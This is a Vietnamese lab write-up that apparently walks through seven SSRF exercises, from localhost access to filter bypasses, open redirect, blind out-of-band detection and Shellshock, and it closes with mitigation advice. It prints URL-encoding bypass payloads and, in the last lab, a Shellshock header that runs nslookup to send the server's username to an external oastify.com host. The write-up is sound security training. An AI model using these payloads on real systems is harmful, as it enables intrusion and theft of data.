# Lỗ Hổng : SSRF

> **Tên Tài Liệu:** VulnLab  
> **Người Thực Hiện:** Bùi Tấn Hưng  
> **Cập Nhật Lần Cuối:** 28/7/2025  

---

## Mục Lục

- Basic SSRF - Localhost  
- Basic SSRF - Back-End System  
- SSRF with Blacklist Filter  
- SSRF with Whitelist Filter  
- SSRF with Open Redirect Bypass  
- Blind SSRF with OAST  
- Blind SSRF with Shellshock  
- Khuyến Nghị & Khắc Phục  

---

## Tóm Tắt

**SSRF (Server-Side Request Forgery)** là lỗ hổng bảo mật xảy ra khi ứng dụng web cho phép người dùng kiểm soát URL mà server sẽ gửi HTTP request đến. Điều này có thể bị lợi dụng để:

- Truy cập hệ thống nội bộ mà bình thường client không thể truy cập.  
- Đánh cắp dữ liệu nội bộ hoặc thực hiện hành vi tấn công như xóa tài khoản.  
- Bypass firewall hoặc các cơ chế lọc.  

---


## 1 Basic SSRF - Localhost

**Mô tả:**
Ứng dụng web có chức năng kiểm tra tồn kho sản phẩm (stock check). Khi người dùng gửi yêu cầu, server sẽ tự động gửi một HTTP request đến một hệ thống nội bộ (internal system) để lấy thông tin tồn kho.

Tuy nhiên, người dùng có thể thay đổi URL của hệ thống tồn kho trong form, dẫn đến việc attacker lừa server truy cập các địa chỉ nội bộ, như http://localhost/admin.

**Khai thác:**
Khi chọn 1 sản phẩm để xem chi tiết thì có chức năng xem hang tồn kho ( checkstock )
Ta dùng Burtsuit để xem request

![Hình minh họa 1](images/ssrf_images/image1.png)

Ở đây khi người dùng gửi yêu cầu, server sẽ tự động gửi một HTTP request đến một hệ thống nội bộ (internal system) để lấy thông tin tồn kho. 
-> Ta thay đổi stockApi bằng địa chỉ nội bộ http://localhost/admin

![Hình minh họa 2](images/ssrf_images/image2.png)

Ta thấy truy cập được trang admin có chứa tài khoản wiener và carlos. Tiếp theo ta thực hiện xóa 2 tài khoản này.

![Hình minh họa 3](images/ssrf_images/image3.png)







## 2 Basic SSRF - Back-End System

**Mô tả:**
Ứng dụng web có chức năng kiểm tra tồn kho (stock check). Khi người dùng nhập URL, server sẽ thực hiện HTTP request đến một hệ thống nội bộ khác trong mạng nội bộ – cụ thể là dải IP 192.168.0.0/24 (một back-end system, không phải localhost).
Người tấn công có thể lợi dụng SSRF để quét dải IP nội bộ nhằm tìm ra hệ thống quản trị ẩn chạy trên port 8080. Sau khi xác định được, attacker có thể truy cập /admin trên hệ thống đó để xóa tài khoản carlos.


**Khai thác:**
Giống  như ở lab trước ta dùng burpsuit để bắt request:
![Hình minh họa 4](images/ssrf_images/image4.png)

Ta thay đổi stockApi thành url nội bộ: http://192.168.0.1:8080/admin thì không truy cập được vì chưa đúng ip

![Hình minh họa 5](images/ssrf_images/image5.png)

Từ đó ta dùng Burp Intruder để quét tìm xem ip nào mới đúng:

![Hình minh họa 6](images/ssrf_images/image6.png)

Sau khi quét thì ta tìm được địa chỉ ip đúng là 192.168.0.77

![Hình minh họa 7](images/ssrf_images/image7.png)

Ta truy cập thành công, tiếp theo ta xóa  tài khoản carlos để hoàn thành bài LAB




## 3 SSRF with Blacklist Filter

**Mô tả:**
Ứng dụng có chức năng kiểm tra tồn kho (stock check), trong đó server sẽ gửi HTTP request đến một URL do người dùng cung cấp.
Để ngăn tấn công SSRF, developer dùng blacklist thủ công để chặn các URL chứa localhost, 127.0.0.1, ::1, nhưng việc lọc này không đầy đủ và có thể bị bypass bằng các kỹ thuật đơn giản.


**Khai thác:**
Giống như 2 bài lab trước, ta dùng burpsuit để bắt request:

![Hình minh họa 8](images/ssrf_images/image8.png)

Sau đó ta thay stockAPI thành url  nội bộ thì bị chặn

![Hình minh họa 9](images/ssrf_images/image9.png)

Ta thử mã hóa kép kí tự “a” trong url  này thành: http://127.1/%2561dmin. Sau đó truy cập thành công

![Hình minh họa 10](images/ssrf_images/image10.png)

Cuối cùng ta thực hiện xóa tài khoản carlos để hoàn thành bài LAB







## 4 SSRF with whitelist-based input filters

**Mô tả:**
Ứng dụng có chức năng stock check, gửi HTTP request đến một URL được cung cấp qua tham số stockApi.
Server lọc đầu vào bằng cách kiểm tra URL phải bắt đầu bằng hostname hợp lệ như stock.weliketoshop.net.
Tuy nhiên, cơ chế kiểm tra chỉ dựa trên hostname hiển thị, không kiểm tra hostname thực sự khi truy cập mạng

**Khai thác:**
Như các bài lab trước thì web sẽ có chức năng kiểm tra tồn kho( check stock ). Dùng burpsuit để bắt request

![Hình minh họa 11](images/ssrf_images/image11.png)

Tôi sửa url ở stockApi lại thành http://127.0.0.1/ và quan sát thấy web đang phân tích URL, trích xuất tên miền và xác thực nó so với whitelist.

![Hình minh họa 12](images/ssrf_images/image12.png)

Ta biết cú pháp URL có dạng :
scheme://username:password@host:port/path?query#fragment
Tiếp theo ta sửa url thành : http://username@stock.weliketoshop.net/ thì thấy sever từ chối

![Hình minh họa 13](images/ssrf_images/image13.png)

Thông báo ghi là “ Internal Server Error” cho thấy máy chủ có thể đã cố gắng kết nối với “username”. Ta sửa username thành localhost:80 thì url thành :
http://localhost:80@stock.weliketoshop.net/. 
Nhưng có thể bị phát hiện khi server phân tích kỹ phần “ username “.Vì thế để bypass thì ta thêm vào 1 kí tự # và mã hóa kép nó 
-> Mục đích là để chặn việc hostname sau # được xử lý. Trình phân tích (parser) sẽ cắt URL tại dấu #, vì # bắt đầu fragment – phần không gửi tới server.
Vậy url cuối cùng là : 
http://localhost:80%2523@stock.weliketoshop.net/admin

![Hình minh họa 14](images/ssrf_images/image14.png)

Cuối cùng ta xóa user Carlos để hoàn thành bài lab


## 5 SSRF with filter bypass via open redirection vulnerability

**Mô tả:**
Ứng dụng có một chức năng kiểm tra tồn kho (stock check) sử dụng tham số stockApi, cho phép server gửi HTTP request đến một URL chỉ định.
Tuy nhiên, để ngăn SSRF, ứng dụng chặn tất cả các request tới địa chỉ không thuộc domain nội bộ (VD: stock.weliketoshop.net). Nhưng nó không kiểm tra redirect xảy ra bên trong.
Ứng dụng lại có một chức năng khác tại /product/nextProduct, cho phép người dùng chỉ định đường dẫn tiếp theo thông qua tham số path
→ server sẽ redirect đến địa chỉ nội bộ, và cơ chế kiểm tra SSRF không phát hiện vì:
-	Chỉ kiểm tra URL ban đầu (/product/nextProduct?...)
-	Không kiểm tra nơi redirect đến
Do đó, attacker có thể truy cập được nội bộ server thông qua open redirect.


**Khai thác:**
Đầu tiên giống các bài lab trước, em cũng thay stockAPI thành http://192.168.0.12:8080/admin xem nó phản hồi như nào . Kết quả là bị từ chối

![Hình minh họa 15](images/ssrf_images/image15.png)

Ở cuối trang có chức năng next sản phấm kế, ta ấn thử 

![Hình minh họa 16](images/ssrf_images/image16.png)

Ta dùng burpsuit thì thấy được request 

![Hình minh họa 17](images/ssrf_images/image17.png)

Ta thấy request này có khả năng bị redirect vì khi chuyển sang sản phẩm khác thì tham số thay đổi để điều hướng. Và dựa vào hình thì server đang trả về status 302 found nghĩa là server đang thực hiện redirect
Nên ta thử thay path bằng 1 path khác : /product/nextProduct?path=http://192.168.0.12:8080/admin 

![Hình minh họa 18](images/ssrf_images/image18.png)

Cuối cùng ta chỉ cần xóa user Carlos để hoàn thành bài LAB



## 6 Blind SSRF with out-of-band detection

**Mô tả:**
Khi người dùng truy cập trang sản phẩm, ứng dụng sẽ gửi một HTTP request tới URL nằm trong header Referer để ghi nhận dữ liệu.
Header Referer có thể bị attacker kiểm soát (dùng Burp Suite), do đó có thể ép server gửi request đến bất kỳ địa chỉ nào → tạo ra lỗ hổng SSRF.
Tuy nhiên, lỗ hổng này là blind SSRF, vì attacker không thấy phản hồi từ server → cần sử dụng kỹ thuật out-of-band detection với Burp Collaborator để xác nhận rằng SSRF đã thực thi.


**Khai thác:**
Đầu tiên dùng Burpsuit để bắt request khi nhấn vào 1 sản phẩm bất kì:

![Hình minh họa 19](images/ssrf_images/image19.png)

Tiếp đến ta thay thế header Referer bằng payload từ Burp collaborator: 536rl88iw30mzut9hw8uuosel5rwfu3j.oastify.com.

![Hình minh họa 20](images/ssrf_images/image20.png)

Sau đó ta gửi request và kiểm tra phản hồi trong tab collaborator thì thấy có các HTTP/DNS interaction

![Hình minh họa 21](images/ssrf_images/image21.png)




## 7 Blind SSRF with Shellshock exploitation

**Mô tả:**
Do server nội bộ nhận các request từ SSRF và xử lý header như User-Agent, attacker có thể:
Gửi SSRF đến server nội bộ thông qua Referer
Đính kèm Shellshock payload vào header User-Agent
Từ đó, ép server nội bộ thực thi lệnh hệ thống


**Khai thác:**
Đầu tiên tôi cũng sẽ dùng burpsuit để bắt request khi chọn 1 sản phẩm bất kì

![Hình minh họa 22](images/ssrf_images/image22.png)

Quan sát request thấy ứng dụng gửi request đến URL trong header Referer.
Tiếp theo ta chuẩn bị 1 payload shellhock: 
() { :; }; /usr/bin/nslookup $(whoami).198nr4ee2z6i5qz5nseq0kyar1xull9a.oastify.com
Payload này dùng nslookup để gửi tên user của hệ thống tới Burp Collaborator.
Tiếp đến ta cấu hình Intruder để brute IP nội bộ Thay Referer thành http://192.168.0.§1§:8080 → §1§ là payload position. Cho chạy từ 1 đến 255

![Hình minh họa 23](images/ssrf_images/image23.png)

Cuối cùng ta quan sát Burp collaborator và thấy DNS request có chứa tên người dùng

![Hình minh họa 24](images/ssrf_images/image24.png)

---

## Khuyến Nghị & Khắc Phục

- **Xác thực đầu vào nghiêm ngặt:** Không tin tưởng URL từ client (bao gồm cả Referer, Host...)
- **Chỉ cho phép domain hợp lệ (Allowlist):** Ví dụ: *.mycompany.com
- **Chặn truy cập IP nội bộ:** 127.0.0.1, 169.254.169.254, 192.168.0.X, 10.0.0.0/8,...
- **Kiểm tra IP sau DNS resolve** để tránh lách hostname.
- **Tách riêng xử lý HTTP request:** Sử dụng message queue như Kafka, RabbitMQ.
- **Giới hạn giao thức:** Chỉ cho phép http/https, chặn file://, gopher://, ftp://, v.v.

